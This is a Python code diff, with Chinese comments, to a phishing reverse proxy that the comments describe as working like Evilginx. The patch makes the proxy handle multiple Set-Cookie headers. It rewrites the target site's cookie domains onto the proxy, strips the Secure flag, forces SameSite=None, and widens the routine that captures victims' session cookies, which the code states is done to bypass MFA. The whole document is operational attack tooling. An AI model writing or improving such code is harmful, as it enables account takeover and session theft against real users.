@@ -109,6 +109,13 @@ def make_handler(phishlet, db_file):
                     fcntl.flock(lf, fcntl.LOCK_UN)
             self.log(f'{kind} uid={uid} {extra or ""}')
 
+        def _multi_setcookie(self, hdrs, raw_headers):
+            # R32D93-N1: dict 折叠重复键——多值 Set-Cookie 三吞二。
+            sc = raw_headers.get_all('Set-Cookie') if hasattr(raw_headers, 'get_all') else None
+            if sc and len(sc) > 1:
+                hdrs['Set-Cookie'] = sc
+            return hdrs
+
         def proxy(self, method='GET', body=None):
             """转发到目标——按 phishlet 规则重写"""
             url = target_base + self.path
@@ -135,10 +142,10 @@ def make_handler(phishlet, db_file):
 
                 req = Request(url, data=body, headers=headers, method=method)
                 resp = opener.open(req, timeout=15)
-                return resp.status, dict(resp.headers), resp.read()
+                return resp.status, self._multi_setcookie(dict(resp.headers), resp.headers), resp.read()
             except HTTPError as e:
                 # 3xx 会走这里(NoRedirect)——headers 里含 Set-Cookie
-                return e.code, dict(e.headers), e.read()
+                return e.code, self._multi_setcookie(dict(e.headers), e.headers), e.read()
             except Exception as e:
                 return 502, {}, str(e).encode()
 
@@ -165,29 +172,36 @@ def make_handler(phishlet, db_file):
                     text = text.replace('</body>', f'{pixel}</body>')
                 body = text.encode()
 
-            # Set-Cookie 域重写(目标的 cookie 种到我们的域)
-            if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
-                raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
-                if isinstance(raw, str):
-                    # R32D91-OBS-A/CS75-F3/CS76-3: 值整体(含 :port 尾)重写
-                    # 为 proxy 域——捕获分隔符(^|;\s* 任意空白, 旧 lookbehind
-                    # 只容恰一空格且无空格 ';'Domain 不中)+属性名(保大小写),
-                    # 锚定边界防 somedomain= 误中; 无匹配原样返回无需预检。
-                    raw = re.sub(r'(?i)(^|;\s*)([Dd]omain=)[^;]*',
-                                 lambda m: m.group(1) + m.group(2) + (proxy_host.rpartition(':')[0] or proxy_host), raw)
-                    raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
-                    raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
-                    # R32D90-F1: 先删异大小写原键再设规范键——此前直赋
-                    # headers['Set-Cookie'] 在原键为 set-cookie/SET-COOKIE
-                    # 时是新增键非替换, 出站双份冲突对。
-                    for hk in [k for k in headers if k.lower() == 'set-cookie']:
-                        headers.pop(hk, None)
-                    headers['Set-Cookie'] = raw
+            # Set-Cookie 域重写(目标的 cookie 种到我们的域)。
+            def _rw_cookie(raw):
+                # CS75-F3/CS76-3: 单条域重写——捕获分隔符(^|;\s* 任意
+                # 空白)+属性名(保大小写), 值整体含 :port 重写, 锚定边界
+                # 防 somedomain= 误中。
+                raw = re.sub(r'(?i)(^|;\s*)([Dd]omain=)[^;]*',
+                             lambda m: m.group(1) + m.group(2) + (proxy_host.rpartition(':')[0] or proxy_host), raw)
+                raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
+                raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
+                return raw
+
+            _sck = [k for k in headers if k.lower() == 'set-cookie']
+            if _sck:  # CS73-F4: 门大小写不敏感; CS72-7: 查找同
+                _sc = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')
+                # R32D93-N1: 多值 list 逐条重写回 list(_respond 展开),
+                # 单值保持原语义; R32D90-F1: 删异大小写原键再设规范键
+                # (直赋在原键异形时是新增键→出站双份)。
+                _rw = ([_rw_cookie(x) if isinstance(x, str) else x for x in _sc]
+                       if isinstance(_sc, list)
+                       else (_rw_cookie(_sc) if isinstance(_sc, str) else _sc))
+                for hk in _sck:
+                    headers.pop(hk, None)
+                headers['Set-Cookie'] = _rw
             return status, headers, body
 
         def check_session_capture(self, headers):
             """检测目标响应里的 session cookie(Evilginx 核心: 拿 cookie 绕 MFA)"""
-            raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS73-F4
+            _sc = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS73-F4
+            # R32D93-N1: 多值 list 拼接待扫(首表外 cookie 也可捕获)。
+            raw = ' ; '.join(_sc) if isinstance(_sc, list) else _sc
             if not raw:
                 return None
             captured = {}
@@ -236,7 +250,8 @@ def make_handler(phishlet, db_file):
             # R32D88-F4: 剥 origin Server/Date(同 phish-proxy, 双份畸形)。
             for k, v in headers.items():
                 if k.lower() not in ('transfer-encoding', 'content-length', 'server', 'date'):
-                    self.send_header(k, v)
+                    for one in (v if isinstance(v, list) else [v]):  # R32D93-N1: 多值逐条
+                        self.send_header(k, one)
             self.send_header('Content-Length', str(len(body)))
             self.end_headers()
             self.wfile.write(body)
